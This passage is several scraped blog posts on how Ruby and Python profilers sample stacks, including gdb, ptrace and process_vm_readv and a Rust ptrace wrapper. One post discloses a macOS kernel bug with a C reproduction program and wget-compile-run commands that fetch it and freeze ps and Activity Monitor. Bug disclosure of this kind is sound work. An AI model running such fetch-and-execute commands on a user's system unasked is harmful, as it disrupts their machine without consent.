code\nfor 14 different profiling libraries and most of those I hadn’t looked at before today), please let\nme know what they are! \n\n 2 kinds of profilers \n\n There are 2 basic kinds of CPU profilers –  sampling  profilers and  tracing  profilers. \n\n Tracing profilers record every function call your program makes and then print out a report at\nthe end. Sampling profilers take a more statistical approach – they record your program’s stack\nevery few milliseconds and then report the results. \n\n The main reason to use a sampling profiler instead of a tracing profiler is that sampling profilers\nare lower overhead. If you just take 20 or 200 samples a second, that’s not very time consuming. And\nthey’re pretty effective – if you’re having a serious performance problem (like 80% of your time is\nbeing spent in 1 slow function), 200 samples a second will often be enough to figure out which\nfunction to blame! \n\n The profilers \n\n Here’s a summary of the profilers we’ll be discussing in this post. (from  this gist ). I’ll explain the jargon in this table ( setitimer ,  rb_add_event_hook ,  ptrace ) a bit later on. The interesting thing here is that all profilers are implemented using a pretty small set of fundamental capabilities. \n\n Python profilers \n\n \n \n \n Name \n Kind \n How it works \n \n \n\n \n \n cProfile \n Tracing \n PyEval_SetProfile \n \n\n \n line_profiler \n Tracing \n PyEval_SetTrace \n \n\n \n pyflame  ( blog post ) \n Sampling \n ptrace + custom timing \n \n\n \n stacksampler \n Sampling \n setitimer \n \n\n \n statprof \n Sampling \n setitimer \n \n\n \n vmprof \n Sampling \n setitimer \n \n\n \n pyinstrument \n Sampling \n PyEval_SetProfile \n \n\n \n gprof  (greenlet) \n Tracing \n greenlet.settrace \n \n\n \n python-flamegraph \n Sampling \n profiling thread + custom timing \n \n\n \n gdb hacks \n Sampling \n ptrace \n \n \n \n\n “gdb hacks” isn’t a Python profiler exactly – it links to website talking about how to implement a\nhacky profiler as a shell script wrapper around gdb. It’s relevant to Python because newer versions\nof gdb will actually unwind the Python stack for you. Kind of a poor man’s pyflame. \n\n Ruby profilers \n\n \n \n \n Name \n Kind \n How it works \n \n \n\n \n \n stackprof  by tmm1 \n Sampling \n setitimer \n \n\n \n perftools.rb  by tmm1 \n Sampling \n setitimer \n \n\n \n rblineprof  by tmm1 \n Tracing \n rb_add_event_hook \n \n\n \n ruby-prof \n Tracing \n rb_add_event_hook \n \n\n \n flamegraph \n Sampling \n stackprof gem \n \n \n \n\n Almost all of these profilers live inside your process \n\n Before we start getting into the details of these profilers there’s one really important thing –\nall of these profilers except  pyflame  run  inside  your Python/Ruby process. If you’re inside a\nPython/Ruby program you generally have pretty easy access to its stack. For example here’s a simple\nPython program that prints the stack of every running thread: \n\n import sys\nimport traceback\n\ndef bar():\n    foo()\n\ndef foo():\n    for _, frame in sys._current_frames().items():\n        for line in traceback.extract_stack(frame):\n            print line\n\nbar()\n \n\n Here’s the output. You can see that it has the function names from the stack, line numbers,\nfilenames – everything you might want to know if you’re profiling. \n\n ('test2.py', 12, '<module>', 'bar()')\n('test2.py', 5, 'bar', 'foo()')\n('test2.py', 9, 'foo', 'for line in traceback.extract_stack(frame):')\n \n\n In Ruby, it’s even easier: you can just  puts caller  to get the stack. \n\n Most of these profilers are C extensions for performance reasons so they’re a little different but C\nextensions to Ruby/Python programs also have really easy access to the call stack. \n\n How tracing profilers work \n\n I did a survey of all the Ruby & Python tracing profilers in the tables above:  rblineprof ,\n ruby-prof ,  line_profiler , and  cProfile . They all work basically the same way. All of them\nrecord all function calls and are written as C extensions to reduce overhead. \n\n How do they work? Well, both Ruby and Python let you specify a callback that gets run when various\ninterpreter events (like “calling a function” or “executing a line of code”) happen. When the\ncallback gets called, it records the stack for later analysis. \n\n I think it’s useful to look exactly where in the code these callbacks get set up so I’ll link to the\nrelevant line of code on github for all of these. \n\n In Python, you can set up that callback with  PyEval_SetTrace  or  PyEval_SetProfile . It’s\ndocumented in this  Profiling and Tracing \nsection of the Python documentation. The docs say “ PyEval_SetTrace  is similar to\n PyEval_SetProfile , except the tracing function does receive line-number events.” \n\n The code: \n\n \n line_profiler  sets up its callback using  PyEval_SetTrace : see  line_profiler.pyx line 157 \n cProfile  sets up its callback using  PyEval_SetProfile : see  _lsprof.c line 693  (cProfile is  implemented using lsprof ) \n \n\n In Ruby, you can set up a callback with  rb_add_event_hook . I couldn’t find any documentation for\nthis but here’s how it gets called \n\n rb_add_event_hook(prof_event_hook,\n      RUBY_EVENT_CALL | RUBY_EVENT_RETURN |\n      RUBY_EVENT_C_CALL | RUBY_EVENT_C_RETURN |\n      RUBY_EVENT_LINE, self);\n \n\n The type signature of  prof_event_hook  is \n\n static void\nprof_event_hook(rb_event_flag_t event, VALUE data, VALUE self, ID mid, VALUE klass)\n \n\n This seems pretty similar to Python’s  PyEval_SetTrace , but more flexible – you can pick which\nevents you want to be notified about (like “just function calls”). \n\n The code: \n\n \n ruby-prof  calls  rb_add_event_hook  here:  ruby-prof.c line 329 \n rblineprof  calls  rb_add_event_hook  here:  rblineprof.c line 649 \n \n\n Disadvantages of tracing profilers \n\n The main disadvantage of tracing profilers implemented in this way is that they introduce a fixed\namount for every function call / line of code executed. This can cause you to make incorrect\ndecisions! For example, if you have 2 implementations of something – one with a lot of function\ncalls and one without, which take the same amount of time, the one with a lot of function calls will\n appear  to be slower when profiled. \n\n To test this a tiny bit, I made a small file called  test.py  with the following contents and\ncompared the running time of  python -mcProfile test.py  and  python test.py .  python test.py  ran\nin about 0.6s and  python -mcProfile test.py  ran in about 1s. So for this particular pathological\nexample  cProfile  introduced an extra ~60% overhead. \n\n def recur(n):\n    if n == 0:\n        return\n    recur(n-1)\n\nfor i in range(5000):\n    recur(700)\n \n\n The documentation for cProfile says: \n\n \n the interpreted nature of Python tends to add so much overhead to execution, that deterministic\nprofiling tends to only add small processing overhead in typical applications \n \n\n This seems like a pretty reasonable assertion – the example program earlier (which does 3.5 million function\ncalls and nothing else) obviously isn’t a typical Python program, and almost any other program would\nhave less overhead. \n\n I didn’t test  ruby-prof  (a Ruby tracing profiler)’s overhead, but its README says: \n\n \n Most programs will run approximately twice as slow while highly recursive programs (like the\nfibonacci series test) will run three times slower. \n \n\n How sampling profilers mostly work: setitimer \n\n Time to talk about the second kind of profiler: sampling profilers! \n\n Most Ruby & Python sampling profilers are implemented using the  setitimer  system call.\nWhat’s that? \n\n Well – let’s say you want to get a snapshot of a program’s stack 50 times a second. A way to do\nthat is: \n\n \n Ask the Linux kernel to send you a signal every 20 milliseconds (using the  setitimer  system\ncall) \n Register a signal handler to record the stack every time you get a signal. \n When you’re done profiling, ask Linux to stop sending you signals and print the output! \n \n\n If you want to see a practical example of  setitimer  being used to implement a sampling profiler, I\nthink  stacksampler.py  is the best example – it’s a useful, working, profiler, and it’s only about 100 lines of Python. So cool! \n\n A reason stacksampler.py is only 100 lines in Python is – when you register a Python function\nas a signal handler, the function gets passed in the current stack of your Python program. So the\nsignal handler  stacksampler.py  registers is really simple: \n\n def _sample(self, signum, frame):\n   stack = []\n   while frame is not None:\n       stack.append(self._format_frame(frame))\n       frame = frame.f_back\n\n   stack = ';'.join(reversed(stack))\n   self._stack_counts[stack] += 1\n \n\n It just gets the stack out of the frame and increases the number of times that particular stack has\nbeen seen by one. Very simple! Very cool! \n\n Let’s go through all the rest of our profilers that use  setitimer  and find where in their\ncode they call  setitimer : \n\n \n stackprof  (Ruby): in  stackprof.c line 118 \n perftools.rb  (Ruby): in  this patch which seems to be applied when the gem is compiled (?) \n stacksampler  (Python):  stacksampler.py line 51 \n statprof  (Python):  statprof.py line 239 \n vmprof  (Python):  vmprof_unix.c line 294 \n \n\n One important thing about  setitimer  is that you need to decide  how to count time . Do you want\n20ms of real “wall clock” time? 20ms of user CPU time? 20 ms of user + system CPU time? If you look\nclosely at the call sites above you’ll notice that these profilers actually make different choices about how to  setitimer \n– sometimes it’s configurable, and sometimes it’s not. The  setitimer man page  is short and worth reading to understand all the options. \n\n @mgedmin on twitter  pointed out one\ninteresting downside of using  setitimer .  this issue   and  this issue  have a bit more detail. \n\n \n One INTERESTING downside of setitimer-based profilers is that the timers cause signals!  Signals sometimes interrupt system calls!  System calls sometimes take a few milliseconds!  If you sample too frequently, you can make your program keep retrying the same syscall  forever ! \n \n\n Sampling profilers that don’t use setitimer \n\n There are a few sampling profilers that doesn’t use  setitimer : \n\n \n pyinstrument  uses  PyEval_SetProfile  (so it’s sort of a tracing profiler in a way), but it\ndoesn’t always collect stack samples when its tracing callback is called. Here’s  the code that chooses when to sample a stack trace  See  this blog post  for more on that decision. (basically:  setitimer  only lets you profile the main thread in Python) \n pyflame  profiles Python code from outside of the process using the  ptrace  system call. It basically just does a loop where it\ngrabs samples, sleeps, and repeats. Here’s the  call to sleep . \n python-flamegraph  takes a similar approach where it starts a new thread in your Python process\nand basically grabs stack traces, sleeps, and repeats. Here’s the  call to sleep . \n \n\n All 3 of these profilers sample using wall clock timing. \n\n pyflame blog posts \n\n I spent almost all my time in this post on profilers other than  pyflame  but  pyflame  is actually\nthe one I’m the most interested in because it profiles your Python program from a separate process,\nand that’s how I want my Ruby profiler to work too. \n\n There’s a lot more to how it does that. I won’t get into it here but Evan Klitzke has written\na lot of really good blog posts about it: \n\n \n Pyflame: Uber Engineering’s Ptracing Profiler for Python \nintroducing pyflame \n Pyflame Dual Interpreter Mode  about how it\nsupports both Python 2 and Python 3 at the same time \n An Unexpected Python ABI Change  on adding\nPython 3.6 support \n Dumping Multi-Threaded Python Stacks \n Pyflame packages \n an  interesting issue with ptrace + syscalls in Python \n Using ptrace for fun and profit ,  ptrace (continued) \n \n\n and there’s more at  https://eklitzke.org/ . All really interesting stuff that I’m going to read more\ncarefully – maybe ptrace is a better approach than  process_vm_readv  for implementing a Ruby\nprofiler!  process_vm_readv  is lower overhead because it doesn’t stop the process, but it also can\ngive you an inconsistent snapshot because it doesn’t stop the process :). In my experiments getting\ninconsistent snapshots wasn’t too big of a problem but I think I’ll do some experimentation here. \n\n That’s all for now! \n\n There are a lot of important subtleties I didn’t get into in this post – for example I basically\nsaid  vmprof  and  stacksampler  are the same (they’re not – vmprof supports line profiling and\nprofiling of Python functions written in C, which I believe introduces more complexity into the\nprofiler). But some of the fundamentals are the same and so I think this survey is a good starting\npoint. \n\n"},
{"url": "https://jvns.ca/blog/2016/06/12/a-weird-system-call-process-vm-readv/", "title": "How to spy on a Ruby program", "content": "\n     \n\n I love debugging tools. One of the most frustrating things to me is – when I run a Ruby or Python program, I can’t find out what that program is doing RIGHT NOW. \n\n You might eagerly interrupt me – julia, you say, you can use pdb! or pry! or  rbtrace! . \n\n So, let me explain. If I’m running a program on the JVM with PID 4242, I can run   jstack -p 4242 , and it will print the current stack trace of the Java program. Any Java program. It doesn’t need any special configuration!! \n\n In C, you can run  sudo perf top  on a Linux machine and it’ll instantly give you a live profile of all the C functions that are running. For any C program. (did you know you can do this?! this is one of my favorite things. it is amazing!).  pstack  does something similar to  jstack , but only for 32-bit binaries :(. \n\n In Ruby.. there’s nothing, yet. You can pre-instrument your Ruby program and there are libraries you can use, but this stuff isn’t built into the ecosystem in the same way. This makes me grumpy because I’m like IF JAVA CAN HAVE NICE THINGS THEN WHY NOT RUBY AND PYTHON?? \n\n So, let’s talk about how you could build jstack for Ruby. \n\n step 1: gdb \n\n Scott Francis from Shopify has this  great gdb script  that will print a Ruby stacktrace if you attach to it with gdb. You can read how the script works in  Adventures in Production Rails Debugging . \n\n It took me a couple of days to understand what’s going on with that script – when you attach to a program with gdb, it seems like basically black magic, but as usual it’s actually not magic at all. \n\n First, let’s explore a little with gdb. This is a little messy, but I want you to see how you explore a program’s memory with gdb because I think it’s cool. I’ve redacted some of the longer output. \n\n # HELLO RUBY. What is the address of the current thread in this process?\n(gdb) p ruby_current_thread\n$1 = (rb_thread_t *) 0x55b89eb775b0\n\n# SWEET. let's get the current frame pointer! That is where\n# we are going to find the stack trace!\n(gdb) p ruby_current_thread->cfp\n$2 = (rb_control_frame_t *) 0x7f217f1dbfc0\n\n# Oh, but I didn't just want the address! Let's see what's inside!\n(gdb) p *(ruby_current_thread->cfp)\n$3 = {pc = 0x55b89ecd2ca0, sp = 0x7f217f0dc020, iseq = 0x55b89ecd2840,\n    flag = 833, self = 94251425195000, klass = 8, ep = 0x55b89ecd2df8,    block_iseq = 0x0,\n    proc = 0, me = 0x0}\n\n# Next step: we need to look at the `iseq` property. That's another\n# pointer, and we'll also dereference it to see what's inside\n(gdb) p ruby_current_thread->cfp->iseq\n$4 = (rb_iseq_t *) 0x55b89ecd2840\n(gdb) p *(ruby_current_thread->cfp->iseq)\n$5 = {type = ISEQ_TYPE_TOP, location = {path = 94251425516800, absolute_path =\n8, base_label = 94251425523360, label = 94251425523360,      first_lineno = 1},\niseq = 0x55b89ecd2c80, iseq_encoded = 0x55b89ecd2ca0, iseq_size = 2, mark_ary =\n[... left out a bunch of stuff here ...]}\n\n# Phew. That was kind of long. Luckily, we just care about\n# `location.path` and `location.label.`\n# Let's print those out!\n(gdb) p *((struct RString*) (ruby_current_thread->cfp + 1)->iseq.location.label)\n$7 = {basic = {...}, as = {heap = ..., \n    ary = \"block in initialize\\000\\000\\000\\000\"}}\n(gdb) p *((struct RString*) (ruby_current_thread->cfp + 1)->iseq.location.path)\n$8 = {basic = {flags = 546318437, klass = 94660819015280}, as = {heap = {len = 64, \nptr = 0x5617f3432440 \"/home/bork/.rbenv/versions/2.1.6/lib/ruby/2.1.0/webrick/utils.rb\",}\n \n\n This is amazing . It’s amazing, because we started with practically nothing – just an address of the current thread! And we finished with a file ( /home/bork/.rbenv/versions/2.1.6/lib/ruby/2.1.0/webrick/utils.rb ), and a place we are in that file:  block in initialize . We had to write a kind of weird thing to get that information ( *((struct RString*) (ruby_current_thread->cfp + 1)->iseq.location.label) ), but we got it. \n\n The  script  from before basically does what I just did, except it’s a little smarter and can also get you line numbers. Cool. \n\n gdb isn’t good enough \n\n So this is pretty awesome. We can attach to almost any Ruby process and get a stack trace! Isn’t that what I wanted? \n\n Well, not quite. gdb uses the  ptrace  system call, in this case to stop the program in its tracks and then intensely query it for its internals. This is slower than what I want. Maybe my Ruby program needed to actually keep running! \n\n When I ran that gdb command  p *((struct RString*) (ruby_current_thread->cfp + 1)->iseq.location.path)  – it does a ton of stuff. I was going to paste the strace output of what gdb is actually doing, but it is 20 megabytes of system calls. So here’s a small excerpt: Every time I need to read memory from the target program (which is what looking up strings is doing!), it issues a bunch of system calls like \n\n ptrace(PTRACE_PEEKTEXT, 5677, 0x5617f3432440, [0x6f622f656d6f682f]) = 0\nptrace(PTRACE_PEEKTEXT, 5677, 0x5617f3432448, [0x6e6562722e2f6b72]) = 0\nptrace(PTRACE_PEEKTEXT, 5677, 0x5617f3432450, [0x6f69737265762f76]) = 0\nptrace(PTRACE_PEEKTEXT, 5677, 0x5617f3432458, [0x362e312e322f736e]) = 0\nptrace(PTRACE_PEEKTEXT, 5677, 0x5617f3432460, [0x6275722f62696c2f]) = 0\nptrace(PTRACE_PEEKTEXT, 5677, 0x5617f3432468, [0x2f302e312e322f79]) = 0\nptrace(PTRACE_PEEKTEXT, 5677, 0x5617f3432470, [0x2f6b636972626577]) = 0\nptrace(PTRACE_PEEKTEXT, 5677, 0x5617f3432478, [0x62722e736c697475]) = 0\nptrace(PTRACE_PEEKTEXT, 5677, 0x5617f3432480, [0x780062722e736c00]) = 0\n \n\n So, how does gdb work? Here’s what it does: \n\n First, it reads debugging info out of my Ruby binary. This tells it the size and structure of the structs it needs access to –  rb_iseq_t ,  struct RString ,  rb_control_frame_t . If you don’t know what the memory at address means, you can’t do anything! \n\n So, let’s say I run  p ruby_current_thread->cfp  in gdb. What does gdb do, exactly? \n\n \n Look up the address of  ruby_current_thread  in the symbol table. Let’s say that’s 0x5617f3432440. \n Look in the debug info to figure out what type it has ( rb_thread_t ) \n Go get the bytes at address  0x5617f3432440 , by using the  ptrace(PTRACE_PEEKTEXT  system call \n Look in the debug info to figure out what the offset is of the  cfp  member of the  rb_thread_t  struct. \n \n\n we’re done! So, this is really cool. We’ve learned how gdb works!  Pris Nasrat  helped me figure out how gdb works. \n\n DWARF \n\n Before we move on, we need to talk about DWARF. Remember when I said it reads debugging info out of the Ruby binary? That uses a format called DWARF. I’m not going to go into how you read that info right now because frankly I don’t know. \n\n But – when people say “you need to compile this with debugging symbols”, what they mean by “debugging symbols” is DWARF. \n\n spying on our program without gdb. \n\n Okay, cool! So, what if we wanted to get stack traces out of a program  without  gdb? Is that a thing that could happen? Turns out: yes! \n\n When we were learning how gdb works, we figured out that as long as you have \n\n \n the debugging info, and \n the ability to read memory from your target program \n \n\n you’re good to go! gdb happens to use the  ptrace  system call to read memory from the Ruby program, but that’s not necessary, it turns out! We are going to make a new friend. \n\n process_vm_readv \n\n Julian Squires  was the person who made me think about all of this in the first place, and I emailed him like UGH JULIAN HOW DO I MAKE THIS WORK and he was like “ process_vm_readv !“. So, what’s that? It’s a Linux system call! The man page says: \n\n These  system calls transfer data between the address space of the\ncalling process (\"the local process\") and the process identified by pid\n(\"the remote process\").  The data moves directly between the address\nspaces of the two processes,  without  passing  through kernel space.\n \n\n So, if I want to spy on the memory of a Ruby program, for example because I’m writing a debugger, I can use  process_vm_readv ! Neat! \n\n The reason this is awesome and better than what gdb does is – as far as I can tell, the impact of  process_vm_readv  on the running process is WAY SMALLER. You just spy on the memory and get out of the way! \n\n actually building a thing \n\n So far this is all just talk. Does this actually work, Julia? Is it real? Sort of! I wrote a program in Rust to sample stack traces. Rust was a cool way to do this because I don’t know how to manually manage memory in C or C++, so literally my C program to do this was just instant memory leaks. In Rust I just had to deal with the compiler, and then I ended up with a working program pretty quickly! \n\n So, I wrote a prototype program to do this. You can see the source  here . \n\n it works, kind of \n\n And it WORKED. It started spitting out stack traces of the Ruby program I was writing, every 10 milliseconds! It was pretty fast! It was amazing! I used it to generate a  flame graph . here is my cool flame graph: \n\n \n\n So, that was the good news. The bad news is that I didn’t actually learn to use the DWARF libraries yet, so I hardcoded all the struct types, and as a result it doesn’t work on anybody’s computer but my own. And then I have an actual programming job to do, which so far is in the way of progress. But instead of feeling bad that I haven’t actually gotten the software to work yet on other peoples’ computers, I thought I would take a couple of hours and tell you how it works! Maybe this will motivate me to actually fix it up and make it into Real Software some day later! \n\n debuggers are exciting \n\n this made me even more excited about writing debugging tools! Some questions I have \n\n \n does this tool, that can spit out Ruby stack traces quickly for any Ruby program with debugging symbols enabled, actually exist somewhere and I just don’t know about it? \n what about for Python? \n maybe it doesn’t exist because a Linux-only Ruby debugging tool is sort of a weird thing? \n if we  can  build this, and it doesn’t exist yet, what other amazing debugging technology could we build? \n \n\n Thanks to Julian Squires, Pris Nasrat, and Kamal Marhubi for helping me with new system calls / gdb / writing Rust! \n\n"},
{"url": "https://jvns.ca/blog/2018/01/08/profiler-week-1--testing---handling-stripped-binaries/", "title": "Profiler week 1: testing & profiling stripped binaries", "content": "\n     \n\n \nThis is part of a series of ongoing posts on building a Ruby profiler!  short summary of the project here .\n \n\n Hello! of working on my Ruby profiler, and so here’s the first weekly update! I’m mostly writing\nthis for myself (to make sure I know what I did last week and what my goals are for the upcoming\nweek). But maybe you will find it interesting too! \n\n Last week I had 2 goals: \n\n \n build integration tests (across various OS / ruby version combinations) \n Make progress towards getting my profiler to work with system Ruby on Debian \n \n\n integration testing the profiler \n\n The thing I’m the most worried about is – I need to be able to reliably get stack traces from a lot\nof different kinds of Ruby binaries. This is nontrivial because my profiler interact with the Ruby\nbinaries in a pretty opaque way – it doesn’t have much insight into Ruby’s internals, it just looks\nat the process’s memory and figures out its stack from there. \n\n To make sure it works on Ruby 3.5.2 without debug symbols installed on Ubuntu 14.04, it’s useful to\nhave integration tests! \n\n There are at least 3 axes I need to test: \n\n \n which Ruby version is running? \n does the the Ruby version have symbols / debug symbols, or is it mostly stripped? \n which OS is it running on? \n \n\n So I started making a few Dockerfiles last week.  ( here’s one of them ) \n\n Right now I’m only testing on Linux (Ubuntu 14.04, 16.04, and Fedora 27). The choice of Fedora 27 is\npretty arbitrary, it was just the first non-debian distro I thought of. Eventually I’d like to\nfigure out how to test on BSD/Mac because the software is almost certainly broken on those right\nnow. Maybe I can use Travis to do that? \n\n This is my script to run the tests right now . It basically just runs the profiler on one Ruby program and makes sure it succeeds. Right now all the rbenv-installed Ruby tests pass and all the system Ruby tests fail. \n\n I’ll add more Ruby versions later (there are many more versions than 2.3.5! =) ) but that should be\neasy. \n\n is it enough to test just rbenv and debian’s Ruby package? \n\n One outstanding question I have is – is it enough just to test both rbenv-installed Ruby and system\nRuby (like the Debian and Fedora Ruby packages)? I suppose I’ll find out! I can always add more\nintegration tests laster. \n\n getting system Ruby to work (partial success!) \n\n My other focus last week was trying to get my profiler to work on system Ruby. Specifically – the\nRuby installed in the  ruby2.3  package on Ubuntu 16.04 is missing one of the key symbols I need to\nfigure out the current stack (the  ruby_current_thread  symbol). \n\n I could deal with this by just asking people to install the  libruby2.3-dbg  package (which contains\ndebug symbols). But it seemed more fun to just try to get it to work without debug symbols. \n\n And I did!!! I managed to find the address of the  ruby_current_thread  symbol through some educated\nguessing!! And once I’d found that address, the profiler actually worked! It got stack traces out of\nthe process! \n\n This is a “partial success” instead of a “total success” because it worked great on my laptop, but\nthen when I tried it in the Docker container it didn’t work. Don’t know why yet but that’s next! \n\n policy for accepting contributions (maybe I’ll use C4) \n\n I was at StarCon this weekend (which I’ll write about later). At StarCon, I met Safia Abdalla, who\nis a much more experience open source maintainer. She gave me some good advice about how to\nstructure an open source project! \n\n In particular: she told me that for\nher main project ( nteract ) they use the “Collective Code\nConstruction Contract” (“C4”) development model from ZeroMQ (see  the spec  and  pieter hintjens’ book chapter describing the philosophy ). I won’t talk more about this now but there are a lot of things I like about it. \n\n code from last week \n\n I merged 3 PRs last week: \n\n \n Reimplement using bindgen-generated Ruby bindings instead of DWARF  – a huge refactor of all of the core functionality that I’m pretty hopeful about. In particular it makes it possible for the profiler to work even if DWARF debugging symbols aren’t available. \n make it possible to profile a subprocess  –\nlets you do  ./profile ruby my-process.rb , which will spawn a subprocess and then profile it. \n set up integration tests \n \n\n and worked on 1 branch.  Here’s the current commit .\nIt’s a mess but the meat is in  get_thread_address_alt  and  is_maybe_thread  (which check if a\ngiven address looks like it  could  be the current thread address). \n\n goals this week \n\n \n Add support for Ruby 1. 8 ⁄ 1 . 9 ⁄ 2 .5 \n Get my branch supporting system Ruby working more reliably \n Write more integration tests and publish Docker images to a Docker registry for them (so that\nother people can easily run the integration tests if they want) \n Give the project an official name and create a github organization for it \n \n\n If I could do all that by the end of the week I would be very happy! \n\n"},
{"url": "https://jvns.ca/blog/2018/01/28/mac-freeze/", "title": "I think I found a Mac kernel bug?", "content": "\n     \n\n I’ve been working on Mac support for  rbspy , and I accidentally\nfound something that looks like a Mac kernel bug!  Basically I managed to write a very short (17\nline) C program that reliably causes  ps  to stop working. Without allocating any memory or anything\nlike that! \n\n This seems to be a kernel bug on High Sierra, but not Sierra – someone  tried to reproduce on Sierra  and couldn’t. So looks like it’s a new bug. \n\n mysterious freezes on mac \n\n This past week I’ve been building Mac support for rbspy (my Ruby profiler). I put a Mac support\nbranch on github yesterday. Some amazing early adopters tried out the branch and reported that it\nfroze their computer (Activity Monitor stopped working, they couldn’t open new terminals, etc). This\nwas extremely surprising – how could that happen?!? There’s a very detailed report at\n https://github.com/rbspy/rbspy/issues/70 . \n\n I was really mystified by this – how could a program  not running as root  freeze someone’s\ncomputer? Somebody suggested that maybe the program was allocating a lot of\nmemory, but I didn’t  think  it was. And it turns out that memory allocations weren’t the problem. \n\n A 17-line C program that freezes (parts of) my Mac \n\n @parkr was incredibly helpful and managed to narrow down the problem to right before calling the\n task_for_pid  Mach function. Since  task_for_pid  seemed to be the issue, I worked on reproducing\nthe issue in a small C program. \n\n Here’s the program that shows the bug. It runs in a loop because it’s a bit race-y and sometimes it\nneeds to try 10 times before it’ll freeze. \n\n #include <mach/mach_init.h>\n#include <mach/port.h>\n#include <sys/wait.h>\n#include <unistd.h>\n#include <stdio.h>\n\nint main() {\n    for (;;) {\n        pid_t pid = fork();\n        if (pid == 0) execv(\"/usr/bin/true\", NULL); \n        mach_port_name_t task = MACH_PORT_NULL;\n        task_for_pid(mach_task_self(), pid, &task);\n        printf(\"Ran task_for_pid\\n\");\n        int wait_status;\n        wait(&wait_status);\n    }\n}\n \n\n Here’s the behaviour I see: \n\n \n Run  ./freeze-mac . (the example program, above) It hangs. \n Run  ps  in another tab. ps hangs, and doesn’t display any output. also trying to  Ctrl+C  to stop  ps  doesn’t work. \n \n\n This happens on the Mac I’ve been developing on (running High Sierra, 10.13.2). \n\n The core issue seems to be – if I  exec  a new program (like  /usr/bin/true ), and then immediately\nrun  task_for_pid  on that program, then the process I ran  task_for_pid  from will hang and  ps \nwill stop working (though I can terminate it with Ctrl+C and then things seem to go back to\nnormal). \n\n If you want to try it out on your Mac, you can run the program yourself! (at your own risk – for me\nit freezes some things but everything goes back to normal if I press ctrl+c, I don’t know what will\nhappen if you run it :) ) \n\n wget https://gist.githubusercontent.com/jvns/16c1ea69352a81658d6d8e9c5a289f2a/raw/ea11fa0a16bfcd4fd019666b790c6c8fe624f9f0/freeze-mac.c\ncc -o freeze-mac freeze-mac.c\n./freeze-mac\n# try running `ps` / starting Activity Monitor, they don't work!\n \n\n this bug is affecting htop too \n\n Somebody on twitter pointed me to  this github issue on htop for mac   where people are reporting that  htop  sometimes\nsporadically freezes their computer in the same way (terminals don’t start, Activity Monitor doesn’t\nwork).  In the\ncomments  @grrrrrrrrr says this\nis a race condition in  task_for_pid  and they have what looks to be a POC that’s similar to what I\nhave here. \n\n I have a workaround! \n\n This is weird and I don’t really understand the underlying kernel issue. Anyway, I have a workaround\nfor this – don’t run  task_for_pid  on processes immediately after exec’ing them, instead sleep for\na few milliseconds first. So hopefully with this new knowledge I can get rbspy to work on Mac\nwithout freezing any users’ computers. \n\n Systems programming is weird and exciting though! \n\n if you have thoughts or questions, here’s the  twitter thread for this post \n\n"},
{"url": "https://jvns.ca/blog/2018/01/15/should-i-pause-a-ruby-process-to-collect-its-stack/", "title": "Should I pause a Ruby process to collect its stack?", "content": "\n     \n\n Hello! This post is about a question about my Ruby profiler that I’ve been wondering about for a few\nweeks now – when I’m collecting a stack trace from a Ruby process, should I use ptrace to pause it\nfirst? \n\n Today for the first time I made some progress on answering this question, so I wanted to write down\nwhat I’ve learned so far! \n\n As a quick refresher on “how profilers work” – basically 100% of the work the profiler does while\nit’s running is collecting stack traces. It collects a stack trace, waits 10 milliseconds, and\nrepeats that forever until it’s asked to stop. Then it generates a useful report about what your\nprogram is doing from all those stack traces. \n\n So collecting stack traces correctly is very important! :) \n\n summary of the interesting things I found out (if you don’t want to read this whole post) \n\n \n pausing a Ruby process with ptrace  doesn’t  completely prevent stack trace sampling errors in\nmy program \n pausing  does  reduce the error rate significantly (pausing: ~ 1 ⁄ 10 ,000, not pausing:\n~ 1 ⁄ 1000 ). My sample size here is extremely small though! Also there might be more errors when not\npausing that I’m not counting. \n the errors that happen when the process is paused happen when we pause the Ruby interpreter during\nfunctions like  vm_call_iseq_setup  and  vm_call_iseq_setup_normal_0start_0params_0locals \n \n\n Why pause a process with ptrace? \n\n The reason to pause a process while collecting its stack is pretty simple – what if, while I’m\ncollecting the process’s stack, the stack  changes ? \n\n If the stack changes while I’m in the middle of collecting it, I might fail to get the stack. That’s\nno good! Initially, it seems pretty obvious that I should pause the process somehow when collecting\nthe stack. \n\n But I think there’s something interesting about profiling Ruby programs in particular which is that\nRuby programs are relatively slow! Like, trying to collect stack traces from a C program without pausing it\nat all I think would be a losing battle. \n\n But with a Ruby program, it turns out that not pausing the Ruby process isn’t completely\nunreasonable! After all, my profiler in Rust is fast, so it has a pretty significant speed advantage\nover the Ruby program. It’s still a race, but the profiler has a pretty good chance of winning. But\nhow good? \n\n What happens if I  don’t  pause the Ruby process I’m profiling? \n\n I just collected 15,000 stack traces from  rubocop  (a Ruby linter) at 100 traces per second, and\nwhile doing that got 20 errors. That’s a little more than 1 error in 1000 stacks. \n\n I think this is already pretty interesting – an error rate of 1 in 1000 isn’t nothing, but it’s\nalso maybe not the end of the world! After all, not pausing the program is a good thing for\noverhead, and this profiler is a statistical profiler anyway. So if I lose 1 stack trace in 1000,\nthat won’t change overall results much. \n\n It’s also possible that some of those stack traces are incorrect and I’m just not noticing, which is\nworrying. So I still have some work to do there. \n\n Next, let’s talk about what happens when \n\n ptracing a process in Rust (it’s very easy!) \n\n Today I did an experiment where I tried pausing the Ruby process while collecting a stack! \n\n Using ptrace to pause a process is  really easy . To show how easy it is: Here’s all the code I\nwrote to support ptracing (I used the nix trace). The only unusual thing here is this  PtracePid \nstruct and this  impl Drop  thing. What’s that? \n\n Well – I wanted to make absolutely sure that after I stopped the Ruby process, I restarted it\nagain. Implementing a custom  Drop  trait on a struct in Rust means that when that struct goes out\nof scope for any reason, the  drop()  method will be called. I believe this pattern is called\n RAII . So that’s what I did! \n\n Here’s the implementation of my tiny struct and the  Drop  trait: \n\n struct PtracePid {\n    pid: pid_t,\n}\n\nimpl PtracePid {\n    fn attach(&self) {\n        // ATTACH attaches to the process and pauses it\n        nix::sys::ptrace::ptrace(ptrace::PTRACE_ATTACH, nix::unistd::Pid::from_raw(self.pid), 0 as * mut c_void, 0 as * mut c_void);\n    }\n\n    fn detach(&self) {\n        // DETACH detaches and lets the process keep going \n        nix::sys::ptrace::ptrace(ptrace::PTRACE_DETACH, nix::unistd::Pid::from_raw(self.pid), 0 as * mut c_void, 0 as * mut c_void);\n    }\n}\n\nimpl Drop for PtracePid {\n    fn drop(&mut self) {\n        self.detach();\n    }\n}\n \n\n And here’s how I called the code: \n\n {\n    let ptrace_struct = PtracePid{pid: pid};\n    ptrace_struct.attach();\n    /* \n      code to get a stack trace goes here\n    */\n    // .detach() gets called automatically when this is done\n}\n \n\n So easy! \n\n Pausing the Ruby process doesn’t completely prevent errors! \n\n This was the most surprising thing to me! I thought that if I paused my process before collecting 